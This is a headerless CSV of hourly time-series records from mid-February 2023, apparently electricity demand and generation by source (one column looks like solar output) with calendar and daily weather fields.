2023-02-13 19:00:00,7955,6725,1374,476,2018,1695,1097,0,65,308,2023-02-13 19:00:00,19,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 20:00:00,7828,6850,1378,494,2049,1721,1144,0,64,309,2023-02-13 20:00:00,20,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 21:00:00,7478,6903,1376,508,2060,1751,1143,0,65,310,2023-02-13 21:00:00,21,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 22:00:00,6807,6786,1378,520,1960,1718,1146,0,65,311,2023-02-13 22:00:00,22,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 23:00:00,6402,6506,1382,504,1709,1742,1104,0,64,312,2023-02-13 23:00:00,23,13,2,61,54,47,11,93,73,15,0.05
2023-02-14 00:00:00,6150,6293,1384,564,1552,1646,1084,0,63,313,2023-02-14 00:00:00,0,14,3,46,40,34,25,72,66,22,0
2023-02-14 01:00:00,5967,6405,1385,572,1544,1747,1094,0,62,314,2023-02-14 01:00:00,1,14,3,46,40,34,25,72,66,22,0
2023-02-14 02:00:00,5783,6435,1386,658,1513,1728,1089,0,62,315,2023-02-14 02:00:00,2,14,3,46,40,34,25,72,66,22,0
2023-02-14 03:00:00,5790,6480,1396,758,1495,1704,1064,0,62,316,2023-02-14 03:00:00,3,14,3,46,40,34,25,72,66,22,0
2023-02-14 04:00:00,5845,6577,1395,798,1516,1732,1073,0,61,317,2023-02-14 04:00:00,4,14,3,46,40,34,25,72,66,22,0
2023-02-14 05:00:00,6062,6684,1394,914,1529,1716,1071,0,62,318,2023-02-14 05:00:00,5,14,3,46,40,34,25,72,66,22,0
2023-02-14 06:00:00,6647,6729,1399,966,1529,1667,1102,0,63,319,2023-02-14 06:00:00,6,14,3,46,40,34,25,72,66,22,0
2023-02-14 07:00:00,7493,7196,1398,964,1938,1706,1117,8,63,320,2023-02-14 07:00:00,7,14,3,46,40,34,25,72,66,22,0
2023-02-14 08:00:00,7915,7408,1395,1012,2012,1682,1119,121,65,321,2023-02-14 08:00:00,8,14,3,46,40,34,25,72,66,22,0
2023-02-14 09:00:00,7963,7589,1366,1074,2002,1675,1129,279,63,322,2023-02-14 09:00:00,9,14,3,46,40,34,25,72,66,22,0
2023-02-14 10:00:00,7958,7668,1374,1008,2003,1708,1102,409,63,323,2023-02-14 10:00:00,10,14,3,46,40,34,25,72,66,22,0
2023-02-14 11:00:00,7712,7689,1369,1040,1907,1679,1109,520,66,324,2023-02-14 11:00:00,11,14,3,46,40,34,25,72,66,22,0
2023-02-14 12:00:00,7566,7554,1374,1000,1820,1633,1084,578,64,325,2023-02-14 12:00:00,12,14,3,46,40,34,25,72,66,22,0
2023-02-14 13:00:00,7544,7725,1385,1142,1783,1687,1078,585,63,326,2023-02-14 13:00:00,13,14,3,46,40,34,25,72,66,22,0
2023-02-14 14:00:00,7455,7940,1361,1264,1873,1763,1103,512,62,327,2023-02-14 14:00:00,14,14,3,46,40,34,25,72,66,22,0
2023-02-14 15:00:00,7349,7864,1378,1499,1766,1715,1051,390,64,328,2023-02-14 15:00:00,15,14,3,46,40,34,25,72,66,22,0
2023-02-14 16:00:00,7382,7882,1393,1922,1684,1652,986,177,67,329,2023-02-14 16:00:00,16,14,3,46,40,34,25,72,66,22,0
2023-02-14 17:00:00,7579,7811,1398,2040,1625,1664,1001,15,67,330,2023-02-14 17:00:00,17,14,3,46,40,34,25,72,66,22,0
2023-02-14 18:00:00,7950,8081,1400,2154,1786,1646,1027,0,67,331,2023-02-14 18:00:00,18,14,3,46,40,34,25,72,66,22,0
2023-02-14 19:00:00,7927,8217,1399,2138,1847,1665,1102,0,67,332,2023-02-14 19:00:00,19,14,3,46,40,34,25,72,66,22,0
2023-02-14 20:00:00,7769,8273,1399,2105,1935,1691,1076,0,66,333,2023-02-14 20:00:00,20,14,3,46,40,34,25,72,66,22,0
2023-02-14 21:00:00,7326,8282,1401,2359,1866,1657,934,0,65,334,2023-02-14 21:00:00,21,14,3,46,40,34,25,72,66,22,0
2023-02-14 22:00:00,6904,8126,1400,2404,1668,1658,930,0,65,335,2023-02-14 22:00:00,22,14,3,46,40,34,25,72,66,22,0
2023-02-14 23:00:00,6438,8219,1403,2431,1634,1748,943,0,62,336,2023-02-14 23:00:00,23,14,3,46,40,34,25,72,66,22,0
2023-02-15 00:00:00,6168,7858,1399,2421,1395,1636,945,0,62,337,2023-02-15 00:00:00,0,15,4,47,38,29,27,84,64,20,0
2023-02-15 01:00:00,6051,7923,1398,2468,1406,1676,913,0,62,338,2023-02-15 01:00:00,1,15,4,47,38,29,27,84,64,20,0
2023-02-15 02:00:00,5875,7786,1402,2470,1322,1632,897,0,61,339,2023-02-15 02:00:00,2,15,4,47,38,29,27,84,64,20,0
2023-02-15 03:00:00,5894,7768,1402,2365,1279,1723,936,0,62,340,2023-02-15 03:00:00,3,15,4,47,38,29,27,84,64,20,0
2023-02-15 04:00:00,5945,7721,1400,2351,1269,1707,930,0,63,341,2023-02-15 04:00:00,4,15,4,47,38,29,27,84,64,20,0
2023-02-15 05:00:00,6176,7732,1403,2385,1285,1677,916,0,63,342,2023-02-15 05:00:00,5,15,4,47,38,29,27,84,64,20,0
2023-02-15 06:00:00,6761,7578,1399,2272,1267,1647,928,0,64,343,2023-02-15 06:00:00,6,15,4,47,38,29,27,84,64,20,0
2023-02-15 07:00:00,7368,7767,1399,2132,1594,1649,923,5,64,344,2023-02-15 07:00:00,7,15,4,47,38,29,27,84,64,20,0
2023-02-15 08:00:00,7754,7754,1399,1857,1725,1665,924,119,65,345,2023-02-15 08:00:00,8,15,4,47,38,29,27,84,64,20,0
2023-02-15 09:00:00,7795,7784,1366,1556,1745,1686,1005,357,67,346,2023-02-15 09:00:00,9,15,4,47,38,29,27,84,64,20,0
2023-02-15 10:00:00,7587,7970,1327,1631,1701,1696,1006,540,66,347,2023-02-15 10:00:00,10,15,4,47,38,29,27,84,64,20,0
2023-02-15 11:00:00,7389,8009,1346,1712,1581,1676,991,638,66,348,2023-02-15 11:00:00,11,15,4,47,38,29,27,84,64,20,0
2023-02-15 12:00:00,7218,7984,1310,1938,1529,1527,930,685,65,349,2023-02-15 12:00:00,12,15,4,47,38,29,27,84,64,20,0
2023-02-15 13:00:00,7190,7897,1327,1890,1413,1571,910,719,66,350,2023-02-15 13:00:00,13,15,4,47,38,29,27,84,64,20,0
2023-02-15 14:00:00,7003,7536,1330,1615,1346,1610,922,647,64,351,2023-02-15 14:00:00,14,15,4,47,38,29,27,84,64,20,0
2023-02-15 15:00:00,6997,7174,1326,1359,1360,1645,928,499,64,352,2023-02-15 15:00:00,15,15,4,47,38,29,27,84,64,20,0
2023-02-15 16:00:00,7067,6738,1361,877,1475,1713,957,286,66,353,2023-02-15 16:00:00,16,15,4,47,38,29,27,84,64,20,0
2023-02-15 17:00:00,7408,6546,1356,612,1700,1768,1002,41,66,354,2023-02-15 17:00:00,17,15,4,47,38,29,27,84,64,20,0
2023-02-15 18:00:00,7888,6594,1383,681,1741,1707,1018,0,66,355,2023-02-15 18:00:00,18,15,4,47,38,29,27,84,64,20,0
2023-02-15 19:00:00,7957,6715,1382,653,1878,1706,1030,0,67,356,2023-02-15 19:00:00,19,15,4,47,38,29,27,84,64,20,0
2023-02-15 20:00:00,7772,6713,1386,697,1853,1683,1027,0,67,357,2023-02-15 20:00:00,20,15,4,47,38,29,27,84,64,20,0
2023-02-15 21:00:00,7375,6752,1390,757,1813,1708,1017,0,67,358,2023-02-15 21:00:00,21,15,4,47,38,29,27,84,64,20,0
2023-02-15 22:00:00,6856,6457,1391,703,1641,1669,987,0,66,359,2023-02-15 22:00:00,22,15,4,47,38,29,27,84,64,20,0
2023-02-15 23:00:00,6417,6269,1392,669,1581,1660,903,0,65,360,2023-02-15 23:00:00,23,15,4,47,38,29,27,84,64,20,0
2023-02-16 00:00:00,5998,6044,1391,675,1429,1581,904,0,62,361,2023-02-16 00:00:00,0,16,5,57,44,31,21,80,45,11,0
2023-02-16 01:00:00,5913,6146,1394,623,1436,1706,924,0,63,362,2023-02-16 01:00:00,1,16,5,57,44,31,21,80,45,11,0
2023-02-16 02:00:00,5863,6066,1399,477,1442,1745,941,0,64,363,2023-02-16 02:00:00,2,16,5,57,44,31,21,80,45,11,0
2023-02-16 03:00:00,5918,6009,1400,270,1510,1779,987,0,63,364,2023-02-16 03:00:00,3,16,5,57,44,31,21,80,45,11,0
2023-02-16 04:00:00,5973,5952,1401,64,1578,1814,1033,0,63,365,2023-02-16 04:00:00,4,16,5,57,44,31,21,80,45,11,0
2023-02-16 05:00:00,6233,5905,1427,-2,1580,1795,1043,0,63,366,2023-02-16 05:00:00,5,16,5,57,44,31,21,80,45,11,0
2023-02-16 06:00:00,6737,5928,1416,0,1655,1780,1010,0,64,367,2023-02-16 06:00:00,6,16,5,57,44,31,21,80,45,11,0
2023-02-16 07:00:00,7435,6156,1437,70,1744,1792,1026,20,65,368,2023-02-16 07:00:00,7,16,5,57,44,31,21,80,45,11,0
2023-02-16 08:00:00,7825,6418,1444,246,1676,1787,1065,134,66,369,2023-02-16 08:00:00,8,16,5,57,44,31,21,80,45,11,0
2023-02-16 09:00:00,7843,6398,1441,433,1519,1655,923,360,66,370,2023-02-16 09:00:00,9,16,5,57,44,31,21,80,45,11,0
2023-02-16 10:00:00,7779,6498,1432,417,1438,1679,919,552,61,371,2023-02-16 10:00:00,10,16,5,57,44,31,21,80,45,11,0
2023-02-16 11:00:00,7357,6482,1416,327,1402,1689,930,650,67,372,2023-02-16 11:00:00,11,16,5,57,44,31,21,80,45,11,0
2023-02-16 12:00:00,7305,6606,1416,270,1541,1694,920,702,64,373,2023-02-16 12:00:00,12,16,5,57,44,31,21,80,45,11,0
2023-02-16 13:00:00,7104,6487,1396,493,1341,1593,892,706,64,374,2023-02-16 13:00:00,13,16,5,57,44,31,21,80,45,11,0
2023-02-16 14:00:00,7072,6524,1395,627,1231,1670,914,622,65,375,2023-02-16 14:00:00,14,16,5,57,44,31,21,80,45,11,0
2023-02-16 15:00:00,7007,6384,1398,580,1208,1692,935,505,66,376,2023-02-16 15:00:00,15,16,5,57,44,31,21,80,45,11,0
2023-02-16 16:00:00,7076,6205,1398,433,1370,1684,940,315,65,377,2023-02-16 16:00:00,16,16,5,57,44,31,21,80,45,11,0
2023-02-16 17:00:00,7386,6348,1398,583,1541,1730,968,61,66,378,2023-02-16 17:00:00,17,16,5,57,44,31,21,80,45,11,0
2023-02-16 18:00:00,7899,6549,1398,723,1665,1738,959,0,67,379,2023-02-16 18:00:00,18,16,5,57,44,31,21,80,45,11,0
2023-02-16 19:00:00,7919,6964,1443,1134,1751,1640,930,0,67,380,2023-02-16 19:00:00,19,16,5,57,44,31,21,80,45,11,0
2023-02-16 20:00:00,7754,7080,1448,1304,1696,1638,928,0,67,381,2023-02-16 20:00:00,20,16,5,57,44,31,21,80,45,11,0
2023-02-16 21:00:00,7224,6925,1457,1293,1590,1614,906,0,66,382,2023-02-16 21:00:00,21,16,5,57,44,31,21,80,45,11,0
2023-02-16 22:00:00,6737,6856,1448,1137,1580,1684,942,0,66,383,2023-02-16 22:00:00,22,16,5,57,44,31,21,80,45,11,0
2023-02-16 23:00:00,6413,7052,1448,1237,1652,1723,926,0,67,384,2023-02-16 23:00:00,23,16,5,57,44,31,21,80,45,11,0
2023-02-17 00:00:00,6154,6857,1450,1210,1489,1674,969,0,65,385,2023-02-17 00:00:00,0,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 01:00:00,5932,7062,1438,1409,1454,1744,952,0,65,386,2023-02-17 01:00:00,1,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 02:00:00,5762,7126,1438,1656,1384,1668,915,0,65,387,2023-02-17 02:00:00,2,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 03:00:00,5708,7089,1438,1572,1397,1695,924,0,64,388,2023-02-17 03:00:00,3,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 04:00:00,5770,7058,1436,1579,1393,1678,907,0,65,389,2023-02-17 04:00:00,4,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 05:00:00,6063,7002,1436,1221,1496,1781,996,0,65,390,2023-02-17 05:00:00,5,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 06:00:00,6671,6947,1455,828,1717,1857,1027,0,64,391,2023-02-17 06:00:00,6,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 07:00:00,7222,6688,1400,614,1844,1769,991,4,66,392,2023-02-17 07:00:00,7,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 08:00:00,7634,6787,1400,563,1894,1734,1021,107,66,393,2023-02-17 08:00:00,8,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 09:00:00,7747,6765,1368,382,1919,1733,1018,277,66,394,2023-02-17 09:00:00,9,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 10:00:00,7591,6648,1363,193,1815,1728,1019,462,67,395,2023-02-17 10:00:00,10,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 11:00:00,7441,6581,1365,138,1736,1720,1020,538,63,396,2023-02-17 11:00:00,11,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 12:00:00,7364,6631,1377,177,1772,1678,1024,539,64,397,2023-02-17 12:00:00,12,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 13:00:00,7329,6547,1387,150,1788,1656,1035,466,65,398,2023-02-17 13:00:00,13,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 14:00:00,7215,6608,1359,213,1821,1733,1009,403,65,399,2023-02-17 14:00:00,14,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 15:00:00,7089,6575,1383,340,1770,1683,999,335,63,400,2023-02-17 15:00:00,15,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 16:00:00,7182,6453,1387,464,1704,1651,1036,143,66,401,2023-02-17 16:00:00,16,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 17:00:00,7384,6423,1393,581,1692,1650,1026,15,65,402,2023-02-17 17:00:00,17,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 18:00:00,7778,6503,1391,608,1782,1646,1011,0,67,403,2023-02-17 18:00:00,18,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 19:00:00,7829,6704,1391,628,1854,1752,1012,0,66,404,2023-02-17 19:00:00,19,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 20:00:00,7601,6593,1391,752,1705,1665,1015,0,65,405,2023-02-17 20:00:00,20,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 21:00:00,7255,6546,1391,740,1683,1659,1009,0,65,406,2023-02-17 21:00:00,21,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 22:00:00,6681,6428,1392,686,1658,1639,986,0,65,407,2023-02-17 22:00:00,22,17,6,54,49,44,16,94,72,8,0.15
2023-02-17 23:00:00,6157,6561,1391,828,1672,1627,979,0,64,408,2023-02-17 23:00:00,23,17,6,54,49,44,16,94,72,8,0.15
2023-02-18 00:00:00,5857,6576,1392,1259,1458,1464,941,0,64,409,2023-02-18 00:00:00,0,18,7,68,59,50,6,96,82,11,0
2023-02-18 01:00:00,5618,6818,1390,1234,1505,1640,987,0,62,410,2023-02-18 01:00:00,1,18,7,68,59,50,6,96,82,11,0
2023-02-18 02:00:00,5529,7138,1393,1609,1449,1621,1007,0,61,411,2023-02-18 02:00:00,2,18,7,68,59,50,6,96,82,11,0
2023-02-18 03:00:00,5481,7362,1399,1871,1422,1611,997,0,63,412,2023-02-18 03:00:00,3,18,7,68,59,50,6,96,82,11,0
2023-02-18 04:00:00,5511,7523,1404,2033,1420,1607,996,0,63,413,2023-02-18 04:00:00,4,18,7,68,59,50,6,96,82,11,0
2023-02-18 05:00:00,5560,7580,1406,2039,1481,1598,995,0,61,414,2023-02-18 05:00:00,5,18,7,68,59,50,6,96,82,11,0
2023-02-18 06:00:00,5719,7543,1402,2278,1351,1503,950,0,60,415,2023-02-18 06:00:00,6,18,7,68,59,50,6,96,82,11,0
2023-02-18 07:00:00,6019,7644,1400,2333,1368,1546,935,1,60,416,2023-02-18 07:00:00,7,18,7,68,59,50,6,96,82,11,0
2023-02-18 08:00:00,6454,7816,1402,2295,1485,1599,936,37,61,417,2023-02-18 08:00:00,8,18,7,68,59,50,6,96,82,11,0
2023-02-18 09:00:00,6627,7810,1403,2105,1627,1587,937,89,62,418,2023-02-18 09:00:00,9,18,7,68,59,50,6,96,82,11,0
2023-02-18 10:00:00,6750,7963,1403,1741,1899,1711,1022,124,62,419,2023-02-18 10:00:00,10,18,7,68,59,50,6,96,82,11,0
2023-02-18 11:00:00,6713,7932,1401,1800,1871,1640,991,166,60,420,2023-02-18 11:00:00,11,18,7,68,59,50,6,96,82,11,0
2023-02-18 12:00:00,6563,7770,1402,1843,1612,1662,993,196,60,421,2023-02-18 12:00:00,12,18,7,68,59,50,6,96,82,11,0
2023-02-18 13:00:00,6472,7751,1402,1862,1587,1602,988,246,62,422,2023-02-18 13:00:00,13,18,7,68,59,50,6,96,82,11,0
2023-02-18 14:00:00,6240,7570,1404,1751,1546,1561,977,252,61,423,2023-02-18 14:00:00,14,18,7,68,59,50,6,96,82,11,0
2023-02-18 15:00:00,6168,7464,1403,1769,1513,1545,976,195,62,424,2023-02-18 15:00:00,15,18,7,68,59,50,6,96,82,11,0
2023-02-18 16:00:00,6250,7429,1403,1707,1573,1570,1006,105,62,425,2023-02-18 16:00:00,16,18,7,68,59,50,6,96,82,11,0
2023-02-18 17:00:00,6476,7366,1402,1720,1627,1540,996,19,62,426,2023-02-18 17:00:00,17,18,7,68,59,50,6,96,82,11,0
2023-02-18 18:00:00,6920,7355,1400,1545,1725,1611,1010,0,62,427,2023-02-18 18:00:00,18,18,7,68,59,50,6,96,82,11,0
2023-02-18 19:00:00,6963,7467,1401,1663,1729,1588,1023,0,61,428,2023-02-18 19:00:00,19,18,7,68,59,50,6,96,82,11,0
2023-02-18 20:00:00,6779,7545,1401,1834,1659,1583,1006,0,61,429,2023-02-18 20:00:00,20,18,7,68,59,50,6,96,82,11,0
2023-02-18 21:00:00,6442,7466,1400,1673,1725,1586,1018,0,62,430,2023-02-18 21:00:00,21,18,7,68,59,50,6,96,82,11,0
2023-02-18 22:00:00,5961,7365,1403,1564,1700,1609,1028,0,59,431,2023-02-18 22:00:00,22,18,7,68,59,50,6,96,82,11,0
2023-02-18 23:00:00,5588,7388,1404,1782,1545,1612,990,0,54,432,2023-02-18 23:00:00,23,18,7,68,59,50,6,96,82,11,0
2023-02-19 00:00:00,5311,7458,1405,2027,1387,1603,987,0,47,433,2023-02-19 00:00:00,0,19,1,74,60,46,5,96,80,22,0
2023-02-19 01:00:00,5141,7491,1402,2021,1376,1631,1007,0,54,434,2023-02-19 01:00:00,1,19,1,74,60,46,5,96,80,22,0
2023-02-19 02:00:00,5064,7640,1407,2190,1379,1629,980,0,54,435,2023-02-19 02:00:00,2,19,1,74,60,46,5,96,80,22,0
2023-02-19 03:00:00,4982,7766,1405,2346,1365,1614,979,0,55,436,2023-02-19 03:00:00,3,19,1,74,60,46,5,96,80,22,0
2023-02-19 04:00:00,5001,7710,1402,2308,1354,1604,984,0,56,437,2023-02-19 04:00:00,4,19,1,74,60,46,5,96,80,22,0
2023-02-19 05:00:00,5041,7617,1405,2162,1375,1623,994,0,57,438,2023-02-19 05:00:00,5,19,1,74,60,46,5,96,80,22,0
2023-02-19 06:00:00,5132,7499,1403,2170,1374,1536,957,0,57,439,2023-02-19 06:00:00,6,19,1,74,60,46,5,96,80,22,0
2023-02-19 07:00:00,5278,7363,1406,2011,1426,1507,940,12,60,440,2023-02-19 07:00:00,7,19,1,74,60,46,5,96,80,22,0
2023-02-19 08:00:00,5437,7143,1402,1808,1372,1483,888,129,60,441,2023-02-19 08:00:00,8,19,1,74,60,46,5,96,80,22,0
2023-02-19 09:00:00,5499,6985,1403,1559,1322,1487,887,265,60,442,2023-02-19 09:00:00,9,19,1,74,60,46,5,96,80,22,0
2023-02-19 10:00:00,5469,6759,1403,975,1405,1590,927,396,60,443,2023-02-19 10:00:00,10,19,1,74,60,46,5,96,80,22,0
2023-02-19 11:00:00,5469,6586,1402,556,1581,1580,925,480,61,444,2023-02-19 11:00:00,11,19,1,74,60,46,5,96,80,22,0
2023-02-19 12:00:00,5498,6958,1403,583,1768,1629,1004,510,59,445,2023-02-19 12:00:00,12,19,1,74,60,46,5,96,80,22,0
2023-02-19 13:00:00,5492,7039,1401,689,1953,1546,970,418,60,446,2023-02-19 13:00:00,13,19,1,74,60,46,5,96,80,22,0
2023-02-19 14:00:00,5405,7004,1402,862,1776,1585,906,414,60,447,2023-02-19 14:00:00,14,19,1,74,60,46,5,96,80,22,0
2023-02-19 15:00:00,5486,6765,1402,724,1725,1633,1007,214,59,448,2023-02-19 15:00:00,15,19,1,74,60,46,5,96,80,22,0
2023-02-19 16:00:00,5658,6723,1403,661,1893,1631,987,87,60,449,2023-02-19 16:00:00,16,19,1,74,60,46,5,96,80,22,0
2023-02-19 17:00:00,5843,6627,1401,806,1783,1585,978,11,60,450,2023-02-19 17:00:00,17,19,1,74,60,46,5,96,80,22,0
2023-02-19 18:00:00,6362,6799,1405,903,1744,1674,1012,0,62,451,2023-02-19 18:00:00,18,19,1,74,60,46,5,96,80,22,0
2023-02-19 19:00:00,6430,7150,1401,1183,1824,1667,1013,0,61,452,2023-02-19 19:00:00,19,19,1,74,60,46,5,96,80,22,0
2023-02-19 20:00:00,6299,7247,1404,1305,1804,1663,1009,0,62,453,2023-02-19 20:00:00,20,19,1,74,60,46,5,96,80,22,0
2023-02-19 21:00:00,6070,7256,1405,1503,1663,1634,987,0,63,454,2023-02-19 21:00:00,21,19,1,74,60,46,5,96,80,22,0
2023-02-19 22:00:00,5645,7180,1402,1761,1541,1568,845,0,62,455,2023-02-19 22:00:00,22,19,1,74,60,46,5,96,80,22,0
2023-02-19 23:00:00,5367,7241,1401,1843,1567,1560,812,0,58,456,2023-02-19 23:00:00,23,19,1,74,60,46,5,96,80,22,0
2023-02-20 00:00:00,5109,7122,1401,1918,1327,1566,851,0,58,457,2023-02-20 00:00:00,0,20,2,65,55,44,11,82,56,17,0
2023-02-20 01:00:00,4989,7576,1401,2267,1422,1488,940,0,57,458,2023-02-20 01:00:00,1,20,2,65,55,44,11,82,56,17,0
2023-02-20 02:00:00,4971,7612,1402,2484,1234,1490,944,0,57,459,2023-02-20 02:00:00,2,20,2,65,55,44,11,82,56,17,0
2023-02-20 03:00:00,4951,7547,1404,2194,1378,1556,958,0,57,460,2023-02-20 03:00:00,3,20,2,65,55,44,11,82,56,17,0
2023-02-20 04:00:00,4974,7516,1403,1943,1598,1549,966,0,56,461,2023-02-20 04:00:00,4,20,2,65,55,44,11,82,56,17,0
2023-02-20 05:00:00,5218,7337,1404,1789,1581,1544,950,0,58,462,2023-02-20 05:00:00,5,20,2,65,55,44,11,82,56,17,0
2023-02-20 06:00:00,5978,7040,1401,1394,1622,1590,975,0,59,463,2023-02-20 06:00:00,6,20,2,65,55,44,11,82,56,17,0
2023-02-20 07:00:00,6785,6921,1401,1050,1749,1618,1033,12,57,464,2023-02-20 07:00:00,7,20,2,65,55,44,11,82,56,17,0
2023-02-20 08:00:00,7322,6838,1399,587,1934,1686,1078,96,58,465,2023-02-20 08:00:00,8,20,2,65,55,44,11,82,56,17,0
2023-02-20 09:00:00,7574,7171,1389,585,2103,1678,1124,234,59,466,2023-02-20 09:00:00,9,20,2,65,55,44,11,82,56,17,0
2023-02-20 10:00:00,7419,7343,1371,735,2068,1615,1098,396,59,467,2023-02-20 10:00:00,10,20,2,65,55,44,11,82,56,17,0
2023-02-20 11:00:00,7221,7262,1395,824,1802,1545,1066,570,59,468,2023-02-20 11:00:00,11,20,2,65,55,44,11,82,56,17,0
2023-02-20 12:00:00,7050,7135,1355,702,1802,1503,1020,695,57,469,2023-02-20 12:00:00,12,20,2,65,55,44,11,82,56,17,0
2023-02-20 13:00:00,7066,7367,1353,1097,1650,1475,999,732,58,470,2023-02-20 13:00:00,13,20,2,65,55,44,11,82,56,17,0
2023-02-20 14:00:00,6913,7269,1364,1442,1198,1520,1022,663,59,471,2023-02-20 14:00:00,14,20,2,65,55,44,11,82,56,17,0
2023-02-20 15:00:00,6786,7148,1341,1457,1227,1506,1032,523,61,472,2023-02-20 15:00:00,15,20,2,65,55,44,11,82,56,17,0
2023-02-20 16:00:00,6961,7207,1369,1544,1387,1545,1054,246,61,473,2023-02-20 16:00:00,16,20,2,65,55,44,11,82,56,17,0
2023-02-20 17:00:00,7149,7027,1349,1487,1481,1567,1053,28,61,474,2023-02-20 17:00:00,17,20,2,65,55,44,11,82,56,17,0
2023-02-20 18:00:00,7537,7505,1388,1860,1542,1595,1060,0,61,475,2023-02-20 18:00:00,18,20,2,65,55,44,11,82,56,17,0
2023-02-20 19:00:00,7610,7624,1390,2076,1489,1561,1047,0,61,476,2023-02-20 19:00:00,19,20,2,65,55,44,11,82,56,17,0
2023-02-20 20:00:00,7464,7734,1388,2155,1494,1579,1057,0,61,477,2023-02-20 20:00:00,20,20,2,65,55,44,11,82,56,17,0
2023-02-20 21:00:00,6965,7804,1397,2207,1524,1556,1059,0,61,478,2023-02-20 21:00:00,21,20,2,65,55,44,11,82,56,17,0
2023-02-20 22:00:00,6494,8032,1397,2470,1518,1556,1030,0,61,479,2023-02-20 22:00:00,22,20,2,65,55,44,11,82,56,17,0
2023-02-20 23:00:00,6056,8064,1398,2631,1388,1582,1005,0,60,480,2023-02-20 23:00:00,23,20,2,65,55,44,11,82,56,17,0
2023-02-21 00:00:00,5721,7927,1396,2588,1415,1469,997,0,60,481,2023-02-21 00:00:00,0,21,3,47,41,34,25,79,69,8,0
2023-02-21 01:00:00,5613,8212,1399,2528,1662,1538,1026,0,59,482,2023-02-21 01:00:00,1,21,3,47,41,34,25,79,69,8,0
2023-02-21 02:00:00,5521,8196,1403,2517,1655,1541,1022,0,58,483,2023-02-21 02:00:00,2,21,3,47,41,34,25,79,69,8,0
2023-02-21 03:00:00,5481,8119,1403,2476,1633,1529,1019,0,58,484,2023-02-21 03:00:00,3,21,3,47,41,34,25,79,69,8,0
2023-02-21 04:00:00,5547,8155,1402,2482,1647,1541,1024,0,58,485,2023-02-21 04:00:00,4,21,3,47,41,34,25,79,69,8,0
2023-02-21 05:00:00,5734,8109,1407,2472,1645,1507,1020,0,57,486,2023-02-21 05:00:00,5,21,3,47,41,34,25,79,69,8,0
2023-02-21 06:00:00,6243,8065,1407,2418,1629,1512,1041,0,57,487,2023-02-21 06:00:00,6,21,3,47,41,34,25,79,69,8,0
2023-02-21 07:00:00,7033,8555,1407,2376,1987,1547,1157,18,61,488,2023-02-21 07:00:00,7,21,3,47,41,34,25,79,69,8,0
2023-02-21 08:00:00,7383,8738,1406,2298,2119,1554,1114,185,61,489,2023-02-21 08:00:00,8,21,3,47,41,34,25,79,69,8,0
2023-02-21 09:00:00,7373,8694,1392,2161,2060,1560,1106,352,61,490,2023-02-21 09:00:00,9,21,3,47,41,34,25,79,69,8,0
2023-02-21 10:00:00,7250,8819,1390,2101,2053,1554,1162,496,61,491,2023-02-21 10:00:00,10,21,3,47,41,34,25,79,69,8,0
2023-02-21 11:00:00,6974,8830,1373,2095,2095,1531,1067,607,61,492,2023-02-21 11:00:00,11,21,3,47,41,34,25,79,69,8,0
2023-02-21 12:00:00,6796,8585,1372,2086,1874,1497,1018,674,60,493,2023-02-21 12:00:00,12,21,3,47,41,34,25,79,69,8,0
2023-02-21 13:00:00,6827,8603,1377,2152,1853,1494,1007,660,58,494,2023-02-21 13:00:00,13,21,3,47,41,34,25,79,69,8,0
2023-02-21 14:00:00,6781,8582,1382,2073,1911,1514,1021,623,58,495,2023-02-21 14:00:00,14,21,3,47,41,34,25,79,69,8,0
2023-02-21 15:00:00,6709,8351,1392,1844,1982,1550,1078,447,58,496,2023-02-21 15:00:00,15,21,3,47,41,34,25,79,69,8,0
2023-02-21 16:00:00,6816,8465,1384,2071,2071,1548,1070,262,56,497,2023-02-21 16:00:00,16,21,3,47,41,34,25,79,69,8,0
2023-02-21 17:00:00,6902,8318,1395,2132,2092,1534,1057,51,57,498,2023-02-21 17:00:00,17,21,3,47,41,34,25,79,69,8,0
2023-02-21 18:00:00,7360,8396,1405,1890,2356,1597,1090,0,59,499,2023-02-21 18:00:00,18,21,3,47,41,34,25,79,69,8,0
2023-02-21 19:00:00,7469,8403,1408,1687,2457,1686,1107,0,59,500,2023-02-21 19:00:00,19,21,3,47,41,34,25,79,69,8,0
2023-02-21 20:00:00,7387,8334,1403,1658,2408,1676,1131,0,59,501,2023-02-21 20:00:00,20,21,3,47,41,34,25,79,69,8,0
2023-02-21 21:00:00,6949,8150,1403,1642,2371,1562,1112,0,59,502,2023-02-21 21:00:00,21,21,3,47,41,34,25,79,69,8,0
2023-02-21 22:00:00,6324,7352,1410,1086,2159,1601,1038,0,57,503,2023-02-21 22:00:00,22,21,3,47,41,34,25,79,69,8,0
2023-02-21 23:00:00,5975,7119,1409,494,2335,1753,1069,0,57,504,2023-02-21 23:00:00,23,21,3,47,41,34,25,79,69,8,0
2023-02-22 00:00:00,5654,6547,1405,214,1970,1805,1095,0,57,505,2023-02-22 00:00:00,0,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 01:00:00,5386,6682,1404,201,2148,1746,1125,0,57,506,2023-02-22 01:00:00,1,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 02:00:00,5311,6561,1406,196,2098,1699,1107,0,55,507,2023-02-22 02:00:00,2,22,4,41,41,40,25,88,81,3,0.05
2023-02-22 03:00:00,5325,6475,1406,176,2080,1669,1086,0,57,508,2023-02-22 03:00:00,3,22,4,41,41,40,25,88,81,3,0.05
